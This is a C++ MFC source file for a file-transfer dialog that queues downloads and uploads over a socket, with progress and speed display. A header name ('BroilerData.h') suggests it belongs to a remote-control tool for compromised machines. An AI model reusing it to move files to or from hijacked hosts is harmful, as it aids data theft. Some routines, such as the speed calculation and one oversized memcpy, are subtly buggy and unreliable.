// FileTrans.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "FileTrans.h"
#include "FileManager.h"
#include "BroilerData.h"

// CFileTrans �Ի���

IMPLEMENT_DYNAMIC(CFileTrans, CDialog)

CFileTrans::CFileTrans(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CFileTrans::IDD, pParent)
{
	m_socket = sock;
	m_pWndMsg = pParent;
}

CFileTrans::~CFileTrans()
{
}

void CFileTrans::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_DOWNLOAD, m_listCtrl);
	DDX_Control(pDX, IDC_FILE_PROCESS, m_filePro);
}


BEGIN_MESSAGE_MAP(CFileTrans, CDialog)
END_MESSAGE_MAP()


// CFileTrans ��Ϣ�������
BOOL CFileTrans::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CFileTrans::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CFileTrans::DlgInit()
{
	m_ImageList.Create(16, 16, ILC_COLOR24 | ILC_MASK, 1, 0);
	CBitmap bmp[2];
	bmp[0].LoadBitmap(IDB_BMP_DOWNLOAD);  //����ͼ��
    bmp[1].LoadBitmap(IDB_BMP_UPLOAD);   //�ϴ�ͼ��
	for(int i = 0; i < 2 ; i++)
	{
		m_ImageList.Add(&bmp[i], RGB(255,255,255));
	}
	m_listCtrl.SetImageList(&m_ImageList, LVSIL_SMALL);

	m_listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	m_listCtrl.InsertColumn(0, _T("��������"), LVCFMT_LEFT, 60);
	m_listCtrl.InsertColumn(1, _T("Դ�ļ�·��"), LVCFMT_LEFT, 230);
	m_listCtrl.InsertColumn(2, _T("Ŀ���ļ�·��"), LVCFMT_LEFT, 230);
	m_listCtrl.InsertColumn(3, _T("�ļ���С"), LVCFMT_LEFT, 70);

	m_filePro.SetRange(0, 100);  //������
	m_bBeginWork = false;
}

void CFileTrans::OnAddFileList(IN int nType, 
							   IN const CString strSourcePath,
							   IN const CString strDesPath,
							   IN const CString strSize,
							   IN const __int64* uSize)
{
	int iCount = m_listCtrl.GetItemCount();
	if (0 == nType)  //����
	{
		m_listCtrl.InsertItem(iCount, FILE_ACTIVE_DOWNLOAD, 0);
	}
	else  //�ϴ�
	{
		m_listCtrl.InsertItem(iCount, FILE_ACTIVE_UPLOAD, 1);
	}
	m_listCtrl.SetItemText(iCount, 1, strSourcePath);  //Դ�ļ� (�⼦���ļ���ŵ�·��)
	m_listCtrl.SetItemText(iCount, 2, strDesPath);     //Ŀ���ļ�(���ش���ڱ��ص�·��)
	m_listCtrl.SetItemText(iCount, 3, strSize);       //�ļ���С
	m_listCtrl.SetItemData(iCount, (DWORD)uSize);

	if (false == m_bBeginWork)
	{
		HANDLE hThread = CreateThread(NULL, 0, BeginToTransFileProc, (LPVOID)this, 0, NULL);  //�����ļ�����Ĺ����߳�
		if (NULL != hThread)
		{
			m_bBeginWork = true;   //���ڹ���
			CloseHandle(hThread);
		}
	}
}

DWORD WINAPI CFileTrans::BeginToTransFileProc( LPVOID lpParameter )
{
	CFileTrans* pThis = (CFileTrans*)lpParameter;
	if (NULL != pThis)
	{
		pThis->TransFile();
	}
	return 0;
}

void CFileTrans::TransFile()
{
	m_filePro.SetPos(0);
	if (0 == m_listCtrl.GetItemCount())  //�����ǰ�б����ļ���Ŀ��������
	{
		m_bBeginWork = false;
		return ;
	}
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	CString strActionType = _T("");  //���ϴ��������ص���Ϊ
	strActionType = m_listCtrl.GetItemText(0, 0);
	wchar_t szDesPath[MAX_PATH];
	if (FILE_ACTIVE_DOWNLOAD == strActionType)  //����
	{
		CString strLocationPath = m_listCtrl.GetItemText(0, 2);   //�����ϵ��ļ�·�����������ģ�
		m_pFile = new CFile(strLocationPath, CFile::modeCreate | CFile::modeReadWrite);  //�����ļ�
		tagMsgInfo.nMsgCmd = CMD_DOWNLOAD;  //��������
		CString strDesPath = m_listCtrl.GetItemText(0, 1);  //�⼦���ļ���·��(��Ҫ�����ļ�·�����͹�ȥ)
		memset(szDesPath, 0, sizeof(szDesPath));
		memcpy(szDesPath, strDesPath.GetBuffer(0), sizeof(szDesPath));
		memcpy((char*)tagMsgInfo.context, (char*)szDesPath, sizeof(szDesPath));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //��������ָ���ļ�������
	}
	else if (FILE_ACTIVE_UPLOAD == strActionType)  //�ϴ�
	{
		tagMsgInfo.nMsgCmd = CMD_UPLOAD;  //�ϴ�����
		CString strDesPath = m_listCtrl.GetItemText(0, 2);  //�ϴ����⼦�ϵ��ļ�·���������ͣ�
		memset(szDesPath, 0, sizeof(szDesPath));
		memcpy(szDesPath, strDesPath.GetBuffer(0), sizeof(szDesPath));
		memcpy((char*)tagMsgInfo.context, (char*)szDesPath, sizeof(szDesPath));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //�����ϴ��ļ�ָ���ļ�������
		SendUploadFileInfo(m_socket);  //�����ļ����ݿ�
	}
	m_dwStartTime = ::GetTickCount();
}

void CFileTrans::SetFileData(IN DOWNFILEDATA_C tagDownFileData)
{
	CString strSpeed = _T("��������: ");
	if (tagDownFileData.bFlag)  //һ���ļ��������
	{
		m_filePro.SetPos(100);
		m_pFile->Close(); //�ر��ļ�
		::CloseHandle(m_pFile->m_hFile);
		delete m_pFile;
		m_listCtrl.DeleteItem(0);    //ɾ����һ��
		HANDLE hThread = CreateThread(NULL, 0, BeginToTransFileProc, (LPVOID)this, 0, NULL);  //�����ļ�����Ĺ����߳�
		if (NULL != hThread)
		{
			CloseHandle(hThread);
		}
		strSpeed += _T(" 0 KB/S");
	}
	else   //һ���ļ���û�д������
	{
		float pos;  //�������ٷֱ�
		m_pFile->Write((char*)tagDownFileData.context, tagDownFileData.size);  //д���ļ�
		pos = float(m_pFile->GetLength() * 1.0 / *(__int64*)m_listCtrl.GetItemData(0));
		m_filePro.SetPos(int(pos * 100));
		DWORD dwTime = ::GetTickCount() - m_dwStartTime;  //�õ���ǰʱ��
		DWORD dwSize = m_pFile->GetLength();
		strSpeed += GetFileTranSpeed(dwSize, dwTime);
	}
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)strSpeed.GetBuffer(0));
}

void CFileTrans::SendUploadFileInfo(IN SOCKET sock )
{
	const int nBufSize = 512;  //�ļ����С
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_FILEUPLOAD;    //�ļ��ϴ�
	DOWNFILEDATA_C tagUploadFileData;
	memset(&tagUploadFileData, 0, sizeof(DOWNFILEDATA_C));
	tagUploadFileData.bFlag = false;

	CString strDesPath = m_listCtrl.GetItemText(0, 1);
	CFile file(strDesPath, CFile::modeRead);
	__int64 ullSize = file.GetLength();  //�ļ���С
	bool bSuccess = true;
    m_filePro.SetPos(0);   //������Ϊ0

	if (ullSize < nBufSize) //�ļ�����һ����
	{
		file.Read((char*)tagUploadFileData.context, (UINT)ullSize);
		tagUploadFileData.size = (UINT)ullSize;
		tagUploadFileData.nCount = 0;
		memcpy((char*)tagMsgInfo.context, (char*)&tagUploadFileData, sizeof(MSGINFO));
		m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	} 
	else  //�ֿ鷢��
	{
		__int64 ullCount = ullSize / nBufSize + 1;   //���͵Ĵ���
		int ullLastSize = ullSize % nBufSize;  //���һ�δ�����ֽ���
		for (int i = 0; i < ullCount; i++)
		{
			memset(tagUploadFileData.context, 0, sizeof(tagUploadFileData.context));
			if ( i == ullCount - 1)  //���һ�δ����ļ�
			{
				file.Read(tagUploadFileData.context, ullLastSize);
				tagUploadFileData.size = ullLastSize;
			}
			else
			{
				file.Read(tagUploadFileData.context, nBufSize);
				tagUploadFileData.size = nBufSize;
			}
			tagUploadFileData.nCount = i;
			memcpy((char*)tagMsgInfo.context, (char*)&tagUploadFileData, sizeof(DOWNFILEDATA_C));
			m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
			float pos = float((i + 1) * 1.0 /ullCount);
			m_filePro.SetPos(int(pos * 100));  //�������İٷֱ�
		}
	}
	m_filePro.SetPos(100);
	tagUploadFileData.bFlag = true;  //�ļ��������
	memcpy((char*)tagMsgInfo.context, (char*)&tagUploadFileData, sizeof(tagUploadFileData));
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	//�ر��ļ����
	file.Close();
	::CloseHandle(file.m_hFile);
	m_listCtrl.DeleteItem(0);
	HANDLE hThread = CreateThread(NULL, 0, BeginToTransFileProc, (LPVOID)this, 0, NULL);  //�����ļ�����Ĺ����߳�
	if (NULL != hThread)
	{
		CloseHandle(hThread);
	}
}

//��ȡ�����ٶȵ��ַ���   
CString CFileTrans::GetFileTranSpeed(DWORD size,DWORD time)  
{  
	CString _speed;  
	//�ж�ʱ���Ƿ�Ϊ0   
	if (time >0)
	{  
		if (size/1024*1000.0/time <1024)  
		{  
			_speed.Format(_T("%.2lfKB/s"),size/1024*1000.0/time);  
		}else   
		{     
			_speed.Format(_T("%.2lfMB/s"),(size/1024)*1000.0/time);  
		}  
	}
	else  
	{  
		return _speed = _T("0KB/s");  
	}  
	return _speed;  
}  

void CFileTrans::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	DestroyWindow();
	delete this;
}

void CFileTrans::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	CDialog::PostNcDestroy();
	((CFileManager*)this->m_pWndMsg)->m_pFileTrans = NULL; 
}
